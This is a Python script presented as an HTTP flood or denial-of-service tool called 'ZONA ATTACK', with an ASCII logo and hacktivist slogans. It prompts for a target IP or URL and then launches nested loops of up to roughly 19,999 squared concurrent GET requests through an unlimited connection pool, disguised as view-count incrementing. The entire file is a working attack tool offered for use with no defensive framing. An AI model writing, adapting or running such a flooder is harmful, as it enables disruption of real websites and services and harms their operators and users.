import socket
import time
import asyncio
import aiohttp
import fade
import os
# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
    os.system("clear")

logo = """

       ±± ±± ±±      ±± ±± ±±                      ±±±             
       ±±       ±±   ±±       ±±                 ±± ±±             
       ±±       ±±   ±±       ±±                    ±±             
       ±±       ±±   ±±       ±±                    ±±             
       ±± ±± ±±      ±± ±± ±±        ________       ±±             
       ±±   ±±       ±±   ±±         ±± ±± ±±       ±±             
       ±±     ±±     ±±     ±±                      ±±             
       ±±       ±±   ±±       ±±                 ±± ±± ±±  
    
++ _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—      
||                                                                   
||                                                                 
||                                            
||                                               
||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_
"""
faded_text = fade.fire(logo)
print(faded_text)
socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ask = fade.pinkred("Enter the target IP/URL:")
url = input(ask)
time.sleep(5),
print("\033[96m                  ⟩⟩  WELCOME \033[0m "),
time.sleep(5),
print("\033[92m                  ⟩⟩  TO ZONA ATTACK \033[0m "),
time.sleep(5),
print("\033[1m                  ⟩⟩  DON'T STOP FIGHT \033[0m "),
time.sleep(5),
print("\033[97m                  ⟩⟩  BECAUSE OF PALESTINE \033[0m "),
time.sleep(5),
print("\033[95m                  ⟩⟩  STILL BURNING \033[0m "),
time.sleep(5),

async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                print("PINGED THIS SHI!")
            else:
                print("Failed ping.")
    except aiohttp.ClientError as e:
        print("An error occurred:", e)

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
